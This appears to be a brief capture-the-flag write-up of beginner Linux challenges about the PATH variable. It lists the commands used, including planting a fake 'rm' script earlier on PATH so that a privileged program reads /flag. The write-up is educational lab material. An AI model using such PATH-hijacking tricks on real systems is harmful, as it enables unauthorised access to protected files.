# Pondering PATH  

# The PATH Variable
Ran `PATH="" /challenge/run` to retreive the flag.  

# Setting PATH
The task was to modify the `PATH` variable to include the directory `/challenge/more_commands/` so that the `win` command could be executed without specifying its full path.  
Commands executed : `PATH=/challenge/more_commands/` followed by `/challenge/run win`  

# Adding Commands 
Executed `echo "cat /flag" > win`   
The script was made executable using the command: `chmod +x win`  
`export PATH=$PATH:./` to include the current directory  
`/challenge/run` to get the flag  

# Hijacking Commands 
The goal was to create a script that hijacks the `rm` command to prevent the deletion of the `/flag` file when executed by the `/challenge/run` program.  
`echo "cat /flag" > rm` to create a script `rm`.   
`chmod +x rm` to make the script executable followed by `export PATH=./:$PATH` to add the currect directory.  
`/challenge/run` to get the flag  



